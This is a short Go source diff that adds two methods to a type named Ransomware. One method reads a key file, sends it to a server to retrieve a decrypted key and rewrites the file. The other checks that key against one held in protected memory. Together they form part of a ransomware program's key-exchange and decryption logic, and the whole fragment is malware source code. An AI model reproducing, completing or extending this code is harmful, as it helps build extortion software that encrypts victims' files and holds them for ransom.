@@ -96,6 +96,47 @@ func (rw *Ransomware) WriteKeyFile() error {
 	return nil
 }
 
+func (rw *Ransomware) GetValidKeyFromServer() error {
+	key, err := ioutil.ReadFile(rw.RootDir + "/key.txt")
+	if err != nil {
+		return err
+	}
+
+	decryptedkey, err := rw.Data.GetKeyFromServer(key)
+	if err != nil {
+		return err
+	}
+
+	if err := rw.RemoveKeyFile(); err != nil {
+		return err
+	}
+
+	if err := ioutil.WriteFile(rw.RootDir+"/key.txt", decryptedkey, 0600); err != nil {
+		return err
+	}
+
+	return nil
+}
+
+func (rw *Ransomware) CheckIfValidMemSafeKey() bool {
+	key, err := ioutil.ReadFile(rw.RootDir + "/key.txt")
+	if err != nil {
+		return false
+	}
+
+	b, err := rw.MemguardKey.Open()
+	if err != nil {
+		return false
+	}
+	defer b.Destroy()
+
+	if bytes.Equal(key, b.Bytes()) {
+		return true
+	}
+
+	return false
+}
+
 func (rw *Ransomware) WriteMemSafeKey() error {
 	b, err := rw.MemguardKey.Open()
 	if err != nil {
